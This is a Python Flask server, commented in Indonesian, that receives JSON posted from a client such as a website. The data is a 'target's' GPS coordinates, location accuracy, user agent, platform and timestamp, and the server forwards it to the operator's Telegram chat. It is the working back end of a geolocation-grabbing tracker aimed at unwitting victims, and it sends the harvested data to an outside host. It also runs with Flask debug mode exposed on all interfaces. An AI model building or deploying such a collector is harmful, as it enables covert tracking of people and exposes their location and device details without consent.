# server_penerima.py

import os
from flask import Flask, request, jsonify
import requests

# --- KONFIGURASI ---
# GANTI dengan Token Bot Anda dan Chat ID Anda
# AMANATAN: Jangan pernah menulis token langsung di kode untuk aplikasi produksi.
# Gunakan variabel lingkungan atau file konfigurasi yang aman.
TELEGRAM_BOT_TOKEN = "MASUKKAN_TOKEN_BOT_ANDA_DI_SINI"
TELEGRAM_CHAT_ID = "MASUKKAN_CHAT_ID_ANDA_DI_SINI"
# -------------------

app = Flask(__name__)

def send_to_telegram(message):
    """
    Fungsi untuk mengirim pesan ke bot Telegram.
    """
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("TOKEN atau CHAT ID belum diisi. Tidak mengirim ke Telegram.")
        return

    api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    try:
        response = requests.post(
            api_url,
            json={
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message,
                'parse_mode': 'Markdown' # Agar pesan lebih terformat
            }
        )
        if response.status_code == 200:
            print("✅ Notifikasi berhasil dikirim ke Telegram.")
        else:
            print(f"❌ Gagal mengirim ke Telegram: {response.text}")
    except Exception as e:
        print(f"❌ Terjadi error saat mengirim ke Telegram: {e}")

@app.route('/')
def index():
    """
    Halaman utama untuk memastikan server berjalan.
    """
    return "Server Penerima Data Berjalan. Kirim data ke endpoint /log"

@app.route('/log', methods=['POST'])
def receive_data():
    """
    Endpoint ini menerima data yang dikirimkan dari klien (misal: website).
    """
    # Cek apakah request memiliki data JSON
    if request.is_json:
        data = request.get_json()
        
        print("="*40)
        print("🚨 DATA DITERIMA:")
        print(data)
        print("="*40)

        # Format data agar lebih mudah dibaca di Telegram
        # Ini adalah simulasi bagaimana data lokasi, user agent, dll dikirim.
        message = f"🚨 *Data Diterima dari Target*\n\n"
        if 'latitude' in data and 'longitude' in data:
            message += f"📍 **Lokasi:** {data['latitude']}, {data['longitude']}\n"
            if 'accuracy' in data:
                message += f"   Akurasi: {data['accuracy']} meter\n"
        
        if 'userAgent' in data:
            message += f"💻 **User Agent:** `{data['userAgent']}`\n"
        
        if 'platform' in data:
            message += f"🖱️ **Platform:** {data['platform']}\n"
        
        if 'timestamp' in data:
            message += f"⏰ **Waktu:** {data['timestamp']}\n"

        # Kirim notifikasi ke Telegram
        send_to_telegram(message)
        
        # Berikan respons ke klien bahwa data berhasil diterima
        return jsonify({"status": "success", "message": "Data logged"}), 200
    else:
        # Jika bukan JSON, kirim error
        return jsonify({"status": "error", "message": "Request must be JSON"}), 400

if __name__ == '__main__':
    # Periksa apakah token dan chat ID sudah diisi
    if "MASUKKAN_TOKEN_BOT_ANDA_DI_SINI" in TELEGRAM_BOT_TOKEN or "MASUKKAN_CHAT_ID_ANDA_DI_SINI" in TELEGRAM_CHAT_ID:
        print("\n" + "!"*40)
        print("PERINGATAN: Silakan isi TELEGRAM_BOT_TOKEN dan TELEGRAM_CHAT_ID terlebih dahulu di dalam kode!")
        print("!"*40 + "\n")
    else:
        print("Server dimulai...")
        print("Buka http://127.0.0.1:5000 di browser untuk mengecek.")
        print("Endpoint untuk menerima data adalah http://127.0.0.1:5000/log")
        # Jalankan server di port 5000
        app.run(host='0.0.0.0', port=5000, debug=True)
